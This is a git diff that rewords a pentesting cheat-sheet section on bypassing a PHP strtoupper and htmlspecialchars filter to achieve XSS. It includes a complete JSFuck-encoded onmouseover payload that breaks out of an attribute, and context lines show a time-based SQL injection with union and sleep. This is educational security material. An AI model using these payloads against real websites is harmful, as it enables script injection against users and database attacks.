@@ -77,7 +77,7 @@ select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
 
 ### Strtoupper Bypass
 
-Say we have a vulnerable PHP code like this:
+Say we have the following PHP code that takes `name` as a user supplied parameter:
 
 ```php
 <?php
@@ -90,19 +90,19 @@ Say we have a vulnerable PHP code like this:
 ?>
 ```
 
-Line 3 is vulnerable to XSS, since we can escape the input with a single quote `'`:
+Line 3 is vulnerable to XSS, and we can break out of the input with a single quote `'`:
 
 ```php
 $sanitized=strtoupper(htmlspecialchars($input));   
 ```
 
-So if we set the `name` parameter to `a'`, we get:
+For example, if we set the `name` parameter to the value of  `a'`, we get:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-21-54-22.png)
 
-Note that the `a` got converted to a capital `A` and this is due ot the `strtoupper` function being called on our input. What this means is that our JavaScript payload will get converted to uppercase and become invalid and will not trigger.
+Note that the `a` got converted to a capital `A` and this is due to the `strtoupper` function being called on our input. What this means is that any ascii letters in our JavaScript payload will get converted to uppercase and become invalid and will not execute \(i.e`alert() != ALERT()`\).
 
-To bypass that constraint, we can encode our payload using JsFuck, which gives us the final payload:
+To bypass this constraint, we can encode our payload using JsFuck, which eliminates all the letters from the payload and leaves us with this:
 
 ```php
 A' onmouseover='[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()'
